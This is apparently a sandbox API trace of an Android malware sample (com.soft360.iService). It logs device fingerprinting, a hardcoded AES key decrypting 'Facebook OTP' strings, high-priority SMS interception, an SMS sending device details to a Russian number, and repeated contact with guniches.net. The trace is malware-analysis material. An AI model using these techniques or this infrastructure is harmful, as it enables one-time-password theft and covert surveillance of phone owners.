{"timestamp":1520989803559,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.BioTechnology.iClientsService44370\/cache"},"args":[]}
{"timestamp":1520989803567,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.BioTechnology.iClientsService44370\/cache"},"args":[]}
{"timestamp":1520989803585,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.BioTechnology.iClientsService44370\/cache\/com.android.renderscript.cache"},"args":[]}
{"timestamp":1520989803614,"class":"javax.crypto.spec.SecretKeySpec","method":"javax.crypto.spec.SecretKeySpec","type":"crypto","args":["o&2V&TZ3g*6U9hIq","AES"]}
{"timestamp":1520989803628,"class":"javax.crypto.spec.SecretKeySpec","method":"javax.crypto.spec.SecretKeySpec","type":"crypto","args":["o&2V&TZ3g*6U9hIq","AES"]}
{"timestamp":1520989803647,"result":"America\/New_York","class":"android.os.SystemProperties","method":"get","type":"content","args":["persist.sys.timezone"]}
{"timestamp":1520989803659,"result":"PERSIST","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.sqlite.journalmode","PERSIST"]}
{"timestamp":1520989803665,"result":"FULL","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.sqlite.syncmode","FULL"]}
{"timestamp":1520989803717,"class":"android.content.ContentValues","method":"put","type":"globals","args":["id","1"]}
{"timestamp":1520989803740,"result":"000000000000000","class":"android.telephony.TelephonyManager","method":"getDeviceId","type":"fingerprint","args":[]}
{"timestamp":1520989803746,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.BioTechnology.iClientsService44370\/shared_prefs\/com.BioTechnology.iClientsService44370_preferences.xml.bak"},"args":[]}
{"timestamp":1520989803756,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.BioTechnology.iClientsService44370\/shared_prefs\/com.BioTechnology.iClientsService44370_preferences.xml"},"args":[]}
{"timestamp":1520989803754,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989803774,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989803781,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989803790,"result":"89014103211118510720","class":"android.telephony.TelephonyManager","method":"getSimSerialNumber","type":"fingerprint","args":[]}
{"timestamp":1520989803807,"result":[{"uid":10049,"importanceReasonImportance":0,"flags":0,"importance":100,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.BioTechnology.iClientsService44370","lru":0,"pkgList":["com.BioTechnology.iClientsService44370"],"pid":714},{"uid":10025,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.quicksearchbox","lru":1,"pkgList":["com.android.quicksearchbox"],"pid":688},{"uid":10008,"importanceReasonImportance":100,"importanceReasonComponent":{"mClass":"com.android.inputmethod.latin.LatinIME","mPackage":"com.android.inputmethod.latin"},"flags":0,"importance":130,"lastTrimLevel":0,"importanceReasonPid":158,"importanceReasonCode":2,"processName":"com.android.inputmethod.latin","lru":0,"pkgList":["com.android.inputmethod.latin"],"pid":236},{"uid":10002,"importanceReasonImportance":100,"importanceReasonComponent":{"mClass":"com.android.defcontainer.DefaultContainerService","mPackage":"com.android.defcontainer"},"flags":0,"importance":200,"lastTrimLevel":0,"importanceReasonPid":158,"importanceReasonCode":2,"processName":"com.android.defcontainer","lru":0,"pkgList":["com.android.defcontainer"],"pid":634},{"uid":10031,"importanceReasonImportance":0,"flags":2,"importance":100,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.systemui","lru":0,"pkgList":["com.android.systemui"],"pid":219},{"uid":1000,"importanceReasonImportance":0,"flags":2,"importance":100,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"system","lru":0,"pkgList":["android","com.android.providers.settings"],"pid":158},{"uid":10005,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.deskclock","lru":1,"pkgList":["com.android.deskclock"],"pid":374},{"uid":10020,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.providers.calendar","lru":2,"pkgList":["com.android.providers.calendar"],"pid":405},{"uid":10003,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.calendar","lru":2,"pkgList":["com.android.calendar"],"pid":345},{"uid":10044,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.noshufou.android.su","lru":3,"pkgList":["com.noshufou.android.su"],"pid":558},{"uid":10045,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"de.robv.android.xposed.installer","lru":3,"pkgList":["de.robv.android.xposed.installer"],"pid":668},{"uid":10001,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"android.process.acore","lru":4,"pkgList":["com.android.providers.applications","com.android.providers.contacts","com.android.providers.userdictionary"],"pid":315},{"uid":10014,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.svox.pico","lru":4,"pkgList":["com.svox.pico"],"pid":655},{"uid":10018,"importanceReasonImportance":0,"flags":0,"importance":130,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.launcher","lru":0,"pkgList":["com.android.launcher"],"pid":276},{"uid":10000,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"android.process.media","lru":5,"pkgList":["com.android.providers.drm","com.android.providers.downloads","com.android.providers.media"],"pid":471},{"uid":10017,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.email","lru":5,"pkgList":["com.android.email"],"pid":491},{"uid":1000,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.settings","lru":6,"pkgList":["com.android.settings"],"pid":253},{"uid":10029,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.exchange","lru":6,"pkgList":["com.android.exchange"],"pid":512},{"uid":1001,"importanceReasonImportance":0,"flags":2,"importance":100,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.phone","lru":0,"pkgList":["com.android.providers.telephony","com.android.phone"],"pid":262},{"uid":10026,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.mms","lru":7,"pkgList":["com.android.mms"],"pid":535},{"uid":10001,"importanceReasonImportance":0,"flags":0,"importance":400,"lastTrimLevel":0,"importanceReasonPid":0,"importanceReasonCode":0,"processName":"com.android.contacts","lru":7,"pkgList":["com.android.contacts"],"pid":436}],"class":"android.app.ActivityManager","method":"getRunningAppProcesses","type":"binder","args":[]}
{"timestamp":1520989804402,"class":"android.content.ContextWrapper","method":"sendBroadcast","type":"binder","args":[{"act":"android.provider.Telephony.SMS_RECEIVED","cmp":"com.BioTechnology.iClientsService44370\/com.soft360.iService.SmsReciever"}]}
{"timestamp":1520989804441,"result":{"mClass":"com.soft360.iService.AService","mPackage":"com.BioTechnology.iClientsService44370"},"class":"android.content.ContextWrapper","method":"startService","type":"binder","args":[{"cmp":"com.BioTechnology.iClientsService44370\/com.soft360.iService.AService"}]}
{"timestamp":1520989804481,"result":{"mClass":"com.soft360.iService.webService","mPackage":"com.BioTechnology.iClientsService44370"},"class":"android.content.ContextWrapper","method":"startService","type":"binder","args":[{"cmp":"com.BioTechnology.iClientsService44370\/com.soft360.iService.webService"}]}
{"timestamp":1520989804485,"result":{"mModified":{"autorun":true},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["autorun","true"]}
{"timestamp":1520989804505,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.BioTechnology.iClientsService44370\/shared_prefs\/com.BioTechnology.iClientsService44370_preferences.xml"},"args":[]}
{"timestamp":1520989804511,"result":{"descriptor":45},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.BioTechnology.iClientsService44370\/shared_prefs\/com.BioTechnology.iClientsService44370_preferences.xml","577"]}
{"timestamp":1520989805002,"result":"\n0x00000000 46 61 63 65 62 6F 6F 6B 20 4F 54 50 00 00 00 00 Facebook.OTP....","class":"javax.crypto.Cipher","method":"doFinal","type":"crypto","this":{"mode":2},"args":["\n0x00000000 F7 2B 9A DD 7F 7F E8 43 87 06 20 6A A4 E5 72 E4 .+.....C...j..r."]}
{"timestamp":1520989805211,"result":"\n0x00000000 4F 6E 65 2D 54 69 6D 65 2D 50 61 73 73 77 6F 72 One-Time-Passwor\n0x00000010 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d...............","class":"javax.crypto.Cipher","method":"doFinal","type":"crypto","this":{"mode":2},"args":["\n0x00000000 5B 41 65 08 DA 33 AA FE BB E7 A5 B1 69 69 C3 FF [Ae..3......ii..\n0x00000010 2A E3 02 53 23 7E EF B9 B4 25 3B A5 FC 2B 93 A7 *..S#....%;..+.."]}
{"timestamp":1520989805712,"result":"\n0x00000000 4C 69 63 65 6E C4 8D 6E C3 AD 20 6B 6C 69 C4 8D Licen..n...kli..","class":"javax.crypto.Cipher","method":"doFinal","type":"crypto","this":{"mode":2},"args":["\n0x00000000 48 3D 06 C5 C7 EC 31 68 4C AD FA 33 1C 1E AA 9F H=....1hL..3...."]}
{"timestamp":1520989806086,"result":"\n0x00000000 56 C3 BD 63 68 6F 64 00 00 00 00 00 00 00 00 00 V..chod.........","class":"javax.crypto.Cipher","method":"doFinal","type":"crypto","this":{"mode":2},"args":["\n0x00000000 55 DB 1D AE B8 A0 EC 48 24 CE A8 6A E4 51 F3 08 U......H$..j.Q.."]}
{"timestamp":1520989806431,"result":"\n0x00000000 47 65 6E 65 72 6F 76 61 74 00 00 00 00 00 00 00 Generovat.......","class":"javax.crypto.Cipher","method":"doFinal","type":"crypto","this":{"mode":2},"args":["\n0x00000000 C3 EA EB F1 45 1B 61 BA 4C BE 22 56 90 59 0E 92 ....E.a.L.\"V.Y.."]}
{"timestamp":1520989806779,"result":"\n0x00000000 47 65 6E 65 72 6F 76 61 74 00 00 00 00 00 00 00 Generovat.......","class":"javax.crypto.Cipher","method":"doFinal","type":"crypto","this":{"mode":2},"args":["\n0x00000000 C3 EA EB F1 45 1B 61 BA 4C BE 22 56 90 59 0E 92 ....E.a.L.\"V.Y.."]}
{"timestamp":1520989807105,"class":"android.content.ContentValues","method":"put","type":"globals","args":["isHacked","0"]}
{"timestamp":1520989807174,"class":"android.app.ActivityThread","method":"handleReceiver","type":"binder","args":["ReceiverData{intent=Intent { act=android.provider.Telephony.SMS_RECEIVED flg=0x10 cmp=com.BioTechnology.iClientsService44370\/com.soft360.iService.SmsReciever } packageName=com.BioTechnology.iClientsService44370 resultCode=-1 resultData=null resultExtras=null}"]}
{"timestamp":1520989807366,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989807385,"class":"android.app.ContextImpl","method":"registerReceiver","type":"binder","args":[{"mDebugUnregister":false},{"mPriority":999,"mActions":["android.provider.Telephony.SMS_RECEIVED"],"mHasPartialTypes":false}]}
{"timestamp":1520989807441,"class":"android.app.ContextImpl","method":"registerReceiver","type":"binder","args":[{"mDebugUnregister":false},{"mPriority":999,"mActions":["android.provider.Telephony.SMS_RECEIVED"],"mHasPartialTypes":false}]}
{"timestamp":1520989808011,"result":"89014103211118510720","class":"android.telephony.TelephonyManager","method":"getSimSerialNumber","type":"fingerprint","args":[]}
{"timestamp":1520989808048,"result":["CONNECTING","CONNECTED","SUSPENDED","DISCONNECTING","DISCONNECTED","UNKNOWN"],"hooked_method":"values","hooked_class":"","args":[],"class":"java.lang.reflect.Method","method":"invoke","type":"reflection"}
{"timestamp":1520989808102,"class":"android.telephony.SmsManager","method":"sendTextMessage","type":"sms","args":["+79858114235","i am (899630400820674151600 + Unknown Nexus 5)"]}
{"timestamp":1520989808425,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/guniches.net"]}
{"timestamp":1520989807864,"class":"android.app.ActivityThread","method":"handleReceiver","type":"binder","args":["ReceiverData{intent=Intent { flg=0x14 cmp=com.BioTechnology.iClientsService44370\/com.soft360.iService.Alarm (has extras) } packageName=com.BioTechnology.iClientsService44370 resultCode=0 resultData=null resultExtras=null}"]}
{"timestamp":1520989808515,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/mnt\/sdcard\/viber\/.userdata"},"args":[]}
{"timestamp":1520989808555,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989808561,"result":"89014103211118510720","class":"android.telephony.TelephonyManager","method":"getSimSerialNumber","type":"fingerprint","args":[]}
{"timestamp":1520989808597,"result":"000000000000000","class":"android.telephony.TelephonyManager","method":"getDeviceId","type":"fingerprint","args":[]}
{"timestamp":1520989808605,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989808617,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989808620,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989808642,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989808669,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/guniches.net"]}
{"timestamp":1520989867542,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/guniches.net"]}
{"timestamp":1520989867501,"class":"android.app.ActivityThread","method":"handleReceiver","type":"binder","args":["ReceiverData{intent=Intent { flg=0x14 cmp=com.BioTechnology.iClientsService44370\/com.soft360.iService.Alarm (has extras) } packageName=com.BioTechnology.iClientsService44370 resultCode=0 resultData=null resultExtras=null}"]}
{"timestamp":1520989867596,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/mnt\/sdcard\/viber\/.userdata"},"args":[]}
{"timestamp":1520989867610,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989867622,"result":"89014103211118510720","class":"android.telephony.TelephonyManager","method":"getSimSerialNumber","type":"fingerprint","args":[]}
{"timestamp":1520989867630,"result":"000000000000000","class":"android.telephony.TelephonyManager","method":"getDeviceId","type":"fingerprint","args":[]}
{"timestamp":1520989867638,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989867645,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989867651,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989867658,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989867674,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/guniches.net"]}
